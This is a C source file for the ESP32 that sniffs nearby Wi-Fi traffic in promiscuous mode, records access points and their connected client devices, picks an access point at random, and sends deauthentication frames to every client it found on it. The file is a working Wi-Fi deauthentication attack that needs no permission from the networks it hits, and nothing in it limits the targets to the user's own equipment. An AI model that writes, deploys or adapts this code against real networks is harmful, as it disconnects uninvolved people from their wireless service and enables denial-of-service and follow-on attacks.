
#include "deauth.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include <stdio.h>
#include <string.h>


static const char *TAG = "SNIFFER";

typedef struct {
  char ssid[33];    // Null-terminated SSID
  uint8_t bssid[6]; // AP MAC address
  uint8_t channel;  // Wi-Fi channel
} ap_info_t;

#define MAX_TRACKED_BSSIDS 50
#define MAX_APS 50
static ap_info_t ap_list[MAX_APS];
static int ap_count = 0;
static uint8_t selected_ap_bssid[6];

bool is_bssid_seen(const uint8_t *bssid) {
  for (int i = 0; i < ap_count; i++) {
    if (memcmp(ap_list[i].bssid, bssid, 6) == 0)
      return true;
  }
  return false;
}

void add_ap(const char *ssid, const uint8_t *bssid, uint8_t channel) {
  if (ap_count >= MAX_APS)
    return;
  strncpy(ap_list[ap_count].ssid, ssid, sizeof(ap_list[ap_count].ssid) - 1);
  memcpy(ap_list[ap_count].bssid, bssid, 6);
  ap_list[ap_count].channel = channel;
  ap_count++;
}
#define MAX_STATIONS 50
static uint8_t station_list[MAX_STATIONS][6];
static int station_count = 0;

bool is_station_seen(const uint8_t *mac) {
  for (int i = 0; i < station_count; i++) {
    if (memcmp(station_list[i], mac, 6) == 0)
      return true;
  }
  return false;
}

void add_station(const uint8_t *mac) {
  if (station_count < MAX_STATIONS) {
    memcpy(station_list[station_count], mac, 6);
    station_count++;
  }
}

static void wifi_sniffer_packet_handler(void *buff,
                                        wifi_promiscuous_pkt_type_t type) {

  const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buff;
  const uint8_t *data = pkt->payload;

  if (type == WIFI_PKT_MGMT) {

    const uint8_t *bssid = &data[10];
    if (is_bssid_seen(bssid))
      return;

    uint8_t ssid_len = data[37];
    if (ssid_len == 0 || ssid_len > 32)
      return;

    char ssid[33] = {0};
    memcpy(ssid, &data[38], ssid_len);

    // Parse tags for channel
    int offset = 38 + ssid_len;
    int channel = -1;
    while (offset < pkt->rx_ctrl.sig_len) {
      uint8_t tag_number = data[offset];
      uint8_t tag_length = data[offset + 1];
      if (tag_number == 3 && tag_length == 1) {
        channel = data[offset + 2];
        break;
      }
      offset += 2 + tag_length;
    }

    if (channel > 0) {
      add_ap(ssid, bssid, channel);
      ESP_LOGI("BEACON",
               "[%d] SSID: %s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %d",
               ap_count, ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4],
               bssid[5], channel);
    }
  } else if (type == WIFI_PKT_DATA) {
    const uint8_t *addr1 = &data[4];  // Destination
    const uint8_t *addr2 = &data[10]; // Source
    const uint8_t *addr3 = &data[16]; // BSSID
    if (memcmp(addr3, selected_ap_bssid, 6) == 0) {
      if (!is_station_seen(addr2)) {
        add_station(addr2);
        ESP_LOGI("CLIENT", "Station found: %02X:%02X:%02X:%02X:%02X:%02X",
                 addr2[0], addr2[1], addr2[2], addr2[3], addr2[4], addr2[5]);
      }
    }
  }
}

void deauth_clients() {
  if (station_count == 0) {
    ESP_LOGW(TAG, "No clients found on this AP.");
    return;
  }

  ESP_LOGI(TAG, "Deauthing %d stations...", station_count);

  for (int i = 0; i < station_count; i++) {
    ESP_LOGI(TAG, "Deauthing client: %02X:%02X:%02X:%02X:%02X:%02X",
             station_list[i][0], station_list[i][1], station_list[i][2],
             station_list[i][3], station_list[i][4], station_list[i][5]);

    send_deauth_packet(selected_ap_bssid, station_list[i]); // Unicast deauth
    vTaskDelay(pdMS_TO_TICKS(50));
  }
}

void selectAP(void) {
  // select a random AP from the list of seen BSSIDs
  if (ap_count == 0) {
    ESP_LOGI(TAG, "No BSSIDs seen yet.");
    return;
  }
  int random_index = esp_random() % ap_count;

  uint8_t *selected_bssid = ap_list[random_index].bssid;
  memcpy(selected_ap_bssid, selected_bssid, 6);

  // display all seen BSSIDs
  ESP_LOGI(TAG, "Seen BSSIDs:");
  for (int i = 0; i < ap_count; i++) {
    ESP_LOGI(TAG, "%02X:%02X:%02X:%02X:%02X:%02X", ap_list[i].bssid[0],
             ap_list[i].bssid[1], ap_list[i].bssid[2], ap_list[i].bssid[3],
             ap_list[i].bssid[4], ap_list[i].bssid[5]);
  }
  // display selected BSSID
  ESP_LOGI(TAG, "Selected BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
           selected_bssid[0], selected_bssid[1], selected_bssid[2],
           selected_bssid[3], selected_bssid[4], selected_bssid[5]);
  // display channel
  ESP_LOGI(TAG, "Selected channel: %d", ap_list[random_index].channel);
  esp_wifi_set_channel(ap_list[random_index].channel, WIFI_SECOND_CHAN_NONE);
  ESP_LOGI(TAG, "Sniffing for clients for 10 seconds...");
  vTaskDelay(pdMS_TO_TICKS(10000)); // Capture stations for 10s
  esp_wifi_set_promiscuous(false);  // Disable sniffer
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_channel(ap_list[random_index].channel, WIFI_SECOND_CHAN_NONE);

  // Here you can add code to connect to the selected AP if needed
  deauth_clients();
  ESP_LOGI(TAG, "Deauth sent to selected AP: %02X:%02X:%02X:%02X:%02X:%02X",
           selected_bssid[0], selected_bssid[1], selected_bssid[2],
           selected_bssid[3], selected_bssid[4], selected_bssid[5]);
}
void channel_hopper_task(void *pvParameters) {
  int ch = 1;
  for (int i = 0; i < 20; i++) { // hop 50 times
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    ESP_LOGI("HOPPER", "Switched to channel %d", ch);
    ch = (ch % 13) + 1;
    vTaskDelay(pdMS_TO_TICKS(300));
  }
  selectAP();        // Call to select an AP after hopping
  vTaskDelete(NULL); // Delete the task after completion
}

void app_main(void) {
  ESP_ERROR_CHECK(nvs_flash_init());
  ESP_ERROR_CHECK(esp_netif_init());
  ESP_ERROR_CHECK(esp_event_loop_create_default());
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));

  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
  ESP_ERROR_CHECK(esp_wifi_start());

  ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
  wifi_promiscuous_filter_t filter = {.filter_mask =
                                          WIFI_PROMIS_FILTER_MASK_DATA |
                                          WIFI_PROMIS_FILTER_MASK_MGMT};
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler));
  xTaskCreate(channel_hopper_task, "channel_hopper_task", 4096, NULL, 1, NULL);
  ESP_LOGI(TAG, "Sniffer started");
}